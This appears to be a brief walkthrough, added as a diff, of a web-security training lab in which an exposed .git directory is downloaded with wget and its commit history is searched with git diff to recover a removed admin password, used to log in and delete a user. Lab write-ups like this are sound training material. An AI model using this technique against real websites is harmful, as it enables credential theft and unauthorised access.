@@ -1,0 +1,37 @@
+there is /.git directory
+
+install the .git directory using the command
+wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
+
+browse the files you installed
+
+$cat refs/heads/master
+1628001805c18b6f475a7c80d1d3e2a2b25a254d
+
+
+inside the logs directory file -> path /logs/refs/heads
+$ cat logs/refs/heads/master 
+0000000000000000000000000000000000000000 1eb393f0b52ab2fecb1370f025f8b41a297867cf Carlos Montoya <carlos@evil-user.net> 1680524308 +0000	commit (initial): Add skeleton admin panel
+1eb393f0b52ab2fecb1370f025f8b41a297867cf 1628001805c18b6f475a7c80d1d3e2a2b25a254d Carlos Montoya <carlos@evil-user.net> 1680524308 +0000	commit: Remove admin password from confi
+
+we found these:
+1eb393f0b52ab2fecb1370f025f8b41a297867cf
+1628001805c18b6f475a7c80d1d3e2a2b25a254d
+
+use the command <git diff> to open these commit
+$ git diff 1eb393f0b52ab2fecb1370f025f8b41a297867cf 1628001805c18b6f475a7c80d1d3e2a2b25a254d 
+
+diff --git a/admin.conf b/admin.conf
+index 3aacd8f..21d23f1 100644
+--- a/admin.conf
++++ b/admin.conf
+@@ -1 +1 @@
+-ADMIN_PASSWORD=cwcdgo3absv2azhoxdvx
++ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+
+password: cwcdgo3absv2azhoxdvx
+
+login and delete carlos
+
+solved
+
